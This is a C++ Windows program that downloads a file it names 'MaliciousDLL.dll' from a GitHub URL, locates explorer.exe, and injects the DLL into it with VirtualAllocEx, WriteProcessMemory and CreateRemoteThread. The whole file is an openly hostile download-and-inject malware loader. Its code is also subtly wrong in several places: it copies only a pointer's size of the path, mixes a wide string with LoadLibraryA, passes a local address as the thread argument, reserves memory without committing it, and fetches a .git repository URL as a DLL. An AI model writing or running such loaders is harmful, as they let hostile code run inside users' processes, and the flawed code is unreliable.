#include <windows.h>
#include <iostream>
#include <tlhelp32.h>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")

bool static DownloadFile(const wchar_t* url, const wchar_t* savePath) 
{
    HRESULT result = URLDownloadToFileW(NULL, url, savePath, 0, NULL);
    return SUCCEEDED(result);
}

int static FindTarget(const wchar_t* ProcName) 
{
	HANDLE hProcSnap;
	PROCESSENTRY32W ProcEntry32;

	int pid = 0;
	ProcEntry32.dwSize = sizeof(PROCESSENTRY32);
	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hProcSnap == INVALID_HANDLE_VALUE) return 0;

	else if (Process32FirstW(hProcSnap, &ProcEntry32) == 0) 
	{
		if (lstrcmpiW(ProcName, ProcEntry32.szExeFile)) pid = ProcEntry32.th32ProcessID;
	}

	else 
	{
		while (Process32NextW(hProcSnap, &ProcEntry32)) 
		{
			if (lstrcmpiW(ProcName, ProcEntry32.szExeFile) == 0) 
			{
				pid = ProcEntry32.th32ProcessID;
				break;
			}
		}
	}

	CloseHandle(hProcSnap);
	return pid;
}

bool static DLLInject(DWORD processID, const wchar_t* dllPath) 
{
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
	PTHREAD_START_ROUTINE pLoadLibrary = NULL;
	PVOID RemoteBuffer;

	if (hProcess == NULL) 
	{
		printf("Failed to open target process. Error: %d\n", GetLastError());
		return FALSE;
	}

	pLoadLibrary = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"Kernel32"), "LoadLibraryA");

	RemoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(dllPath), MEM_RESERVE, PAGE_READWRITE);
	WriteProcessMemory(hProcess, RemoteBuffer, dllPath, sizeof(dllPath), NULL);
	CreateRemoteThread(hProcess, NULL, 0, pLoadLibrary, &dllPath, 0, NULL);

	CloseHandle(hProcess);
	return TRUE;
}

int main() 
{
	const wchar_t* downloadUrl = L"https://github.com/AlSharji0/FileHide.git";
	const wchar_t* savePath = L"C:\\Temp\\MaliciousDLL.dll";
	
	DownloadFile(downloadUrl, savePath);

	const wchar_t* ProcName = L"explorer.exe";
	int pid = FindTarget(ProcName);

	if (!DLLInject(pid, savePath))
	{
		return -1;
	}

	return 0;
}